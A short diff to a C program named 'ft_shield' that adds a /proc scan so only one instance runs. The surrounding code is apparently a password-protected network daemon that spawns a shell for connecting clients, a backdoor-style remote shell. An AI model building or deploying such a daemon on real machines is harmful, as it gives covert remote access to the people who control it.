@@ -2,6 +2,7 @@
 #include "errno.h"
 
 int nb_clients = 0;
+#define NAME "ft_shield"
 
 // Return 64-bit FNV-1a hash for a given password. See:
 // https://en.wikipedia.org/wiki/Fowler–Noll–Vo_hash_function
@@ -48,6 +49,36 @@ char *readline(int fd) {
 	return cmd;
 }
 
+bool pgrep(char *name) {
+	DIR *proc = opendir("/proc");
+	struct dirent *entry;
+	int pid = getpid();
+
+	if (!proc)
+		return false;
+	
+	while ((entry = readdir(proc))) {
+		if (entry->d_type == DT_DIR && strspn(entry->d_name, "0123456789") == ft_strlen(entry->d_name)) {
+			char path[256] = {};
+			snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
+
+			int fd = open(path, O_RDONLY);
+			if (fd > 0) {
+				char comm[256] = {};
+				if (read(fd, comm, 255) > 0 && !ft_strcmp(comm, name)
+					&& atoi(entry->d_name) != pid) {
+					close(fd);
+					return true;
+				}
+				close(fd);
+			}
+		}
+	}
+
+	closedir(proc);
+	return false;
+}
+
 void sh(Client *client, int pipefd) {
 	if (!fork()) {
 		int pid_child = fork();
@@ -74,6 +105,12 @@ void check_password(Client *client, char *line) {
 }
 
 int main() {
+	if (pgrep(NAME"\n")) {
+		DEBUG("There's already an instance\n");
+		return false;
+	}
+
+
 	struct sockaddr_in addr = {};
 	struct epoll_event ev, events[MAX_CLIENTS];
 	Client clients[MAX_CLIENTS] = {};
